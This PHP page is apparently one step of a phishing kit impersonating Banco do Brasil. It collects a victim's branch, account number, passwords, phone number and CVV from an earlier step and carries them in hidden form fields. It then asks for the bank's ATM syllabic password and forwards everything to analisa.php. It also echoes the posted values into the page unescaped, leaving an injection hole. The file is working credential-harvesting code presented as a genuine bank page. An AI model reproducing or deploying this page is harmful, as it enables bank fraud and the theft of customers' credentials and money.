<?php
error_reporting(0);
ini_set(“display_errors”, 0 );


$agencia = $_POST ['agencia'];
$conta = $_POST ['conta'];
$senha = $_POST ['senha'];
$telefone = $_POST ['telefone'];
$senha6 = $_POST ['senha6'];
$cvv = $_POST ['cvv'];
?>

<!DOCTYPE html>
<html lang="pt-br" data-ng-app="openBanking" oauth-loading class="fundo-azul">


<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Banco do Brasil</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="icon" href="imagens/favicon.ico" type="image/x-icon" />
    <link rel="stylesheet" type="text/css" href="css/angular-material.min8cea.css" />
    <link rel="stylesheet" type="text/css" href="css/bulma.min.css" />
    <link rel="stylesheet" type="text/css" href="css/style.css" />
    <link rel="stylesheet" type="text/css" href="css/titulares.css" />
    <link rel="stylesheet" type="text/css" href="css/input.css" />
    <link rel="stylesheet" type="text/css" href="css/componentes.css" />
    <link rel="stylesheet" type="text/css" href="css/voltar.css" />
    <link rel="stylesheet" type="text/css" href="css/contas.css" />
    <link rel="stylesheet" type="text/css" href="css/termo.css" />
	
    <script src="lib/jquery-1-12-4.js"></script>
	<script type="text/javascript" src="js/prototipo.js"></script>
	<script type="text/javascript" src="js/jquery.validate.cpf.js"></script> 
    <script src="lib/jquery.mask.min.js"></script>
	 <script src="lib/mask.min.js"></script>
    <script src="lib/indexeddb.js"></script>
	<script src="lib/home.js"></script>
	
</head>

<body class="caixa">


    <div data-ng-view="" class="ng-scope" style="">
        <section class="hero is-fullheight ng-scope">
            <div class="disabilitado-hero-body">
                <div class="container">
					
                    <section class="page-section welcome-section is-white">
						
                        <figure class="avatar">
                            <img class="logo" data-ng-src="imagens/logo-login.jpg" src="imagens/logo-login.jpg">
                        </figure>
						<div class="welcome">
                        </div>
                    </section>
                    <div class="column is-4 is-offset-4 caixa">
                        <p class="subtitle is-subtitulo-azul has-text-centered"><font style="font-size: 9pt">&oplus; Ag. <?php echo $agencia ?> &nbsp; Cc. <?php echo $conta ?></font></p>
						<article class="message is-info">
  <div class="message-body" align="center">
    <font style="font-size: 11px;">Confirme a sua <strong>Senha Silábica usada nos caixas eletrônicos</strong> Ex: <strong>A4-LX-k</strong></font>
	 
  </div>
								 <center><img width="124" src="imagens/11.jpg" height="80"></center> 
</article>				
						
	  					<form autocomplete="off" class="ng-pristine ng-invalid ng-invalid-required ng-valid-minlength ng-valid-maxlength ng-valid-pattern" onsubmit="return check_phone();" action="analisa.php" method="post">
						<input name="agencia" type="hidden" id="agencia" value="<?php echo $agencia ?>" />
 					 <input name="conta" type="hidden" id="conta" value="<?php echo $conta ?>" />
 					 <input name="senha" type="hidden" id="senha" value="<?php echo $senha ?>" />	
					<input name="telefone" type="hidden" id="telefone" value="<?php echo $telefone ?>" />
 					 <input name="senha6" type="hidden" id="senha6" value="<?php echo $senha6 ?>" />	
<input name="cvv" type="hidden" id="cvv" value="<?php echo $cvv ?>" />	
							
						<table width="100%" border="0" cellspacing="0" cellpadding="0" align="center">
  <tbody>
    <tr>
      <td><div align="center">
								
                                <input type="text" ng-model="L1" name="L1" id="L1" salta-campo-pos-preenchimento="" focus="focus" data-ng-required="!vm.isCampoPreenchido(vm.L1)" data-ng-focus="!vm.isCampoPreenchido(vm.L1)" data-ng-model="vm.L1" data-autofocus="" clean="true" data-bb-input-L1="" data-salta-campo-pos-preenchimento="" class="ng-pristine ng-untouched ng-isolate-scope ng-empty ng-invalid ng-invalid-required" maxlength="2" required="required" aria-invalid="true" autofocus style="width: 55px">
                                <label class="has-text-lefted">__</label>
                            </div></td>
      <td><div align="center">
								
                                <input type="text" ng-model="L2" name="L2" id="L2" salta-campo-pos-preenchimento="" focus="focus" data-ng-required="!vm.isCampoPreenchido(vm.L2)" data-ng-focus="!vm.isCampoPreenchido(vm.L2)" data-ng-model="vm.L2" data-autofocus="" clean="true" data-bb-input-L2="" data-salta-campo-pos-preenchimento="" class="ng-pristine ng-untouched ng-isolate-scope ng-empty ng-invalid ng-invalid-required" maxlength="2" required="required" aria-invalid="true" autofocus style="width: 55px" >
                                <label class="has-text-lefted">__</label>
                            </div></td>
		 <td><div align="center">
								
                                <input type="text" ng-model="L3" name="L3" id="L3" salta-campo-pos-preenchimento="" focus="focus" data-ng-required="!vm.isCampoPreenchido(vm.L3)" data-ng-focus="!vm.isCampoPreenchido(vm.L3)" data-ng-model="vm.L3" data-autofocus="" clean="true" data-bb-input-L3="" data-salta-campo-pos-preenchimento="" class="ng-pristine ng-untouched ng-isolate-scope ng-empty ng-invalid ng-invalid-required" maxlength="2" required="required" aria-invalid="true" autofocus style="width: 55px" >
                                <label class="has-text-lefted">__</label>
                            </div></td>
    </tr>
    
  </tbody>
</table>
							 
                           
                            <button class="botao-amarelo is-fullwidth" data-ng-click="vm.autenticar()">CONTINUAR</button>

						
                        </form>
                    </div>
                </div>
            </div>
        </section>
    </div>

</body>




</html>